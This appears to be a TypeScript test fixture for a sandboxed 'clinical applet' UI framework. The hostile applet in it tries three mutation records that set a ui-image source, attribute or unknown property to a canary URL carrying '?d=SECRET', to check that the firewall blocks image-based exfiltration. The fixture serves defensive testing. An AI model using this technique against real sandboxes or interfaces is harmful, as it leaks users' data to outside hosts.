// Hostile applet: try to turn an image into an exfil sink by driving a raw mutation
// that sets a remote `src` (and an external attribute, and a now-removed `handle`
// prop) on ui-image pointing at the canary. `ui-image` accepts only a `data:` `src`;
// the firewall rejects a remote src, any attribute, and the unknown `handle` prop —
// no network request is ever made.
import {ThreadMessagePort} from '@quilted/threads';
import {PROTOCOL_VERSION} from '../../../src/shared/protocol';

const CANARY = 'http://localhost:4399/image-src-exfil?d=SECRET';
const INSERT = 0;
const ELEMENT = 1;

self.addEventListener('message', (event: MessageEvent<{type?: string}>) => {
  if (event.data?.type !== 'clinical-applet/connect') return;
  const port = event.ports[0];
  if (!port) return;
  port.start();
  const thread = new ThreadMessagePort(port, {exports: {ping: async () => ({ok: true})}});
  void (async () => {
    const handshake: any = await (thread.imports as any).connect({
      protocolVersion: PROTOCOL_VERSION,
      appletId: 'hostile.image-src-exfil',
      appletVersion: '0',
    });
    const conn = handshake.remoteConnection;
    const tries: Array<readonly unknown[]> = [
      [INSERT, '~', {id: 'a', type: ELEMENT, element: 'ui-image', properties: {src: CANARY}, children: []}, 0],
      [INSERT, '~', {id: 'b', type: ELEMENT, element: 'ui-image', attributes: {src: CANARY}, children: []}, 0],
      [INSERT, '~', {id: 'c', type: ELEMENT, element: 'ui-image', properties: {handle: CANARY}, children: []}, 0],
    ];
    for (const record of tries) {
      try {
        conn.mutate([record]);
      } catch {
        /* expected: firewall rejects remote src, attributes, and the unknown handle prop — no fetch */
      }
    }
  })();
});
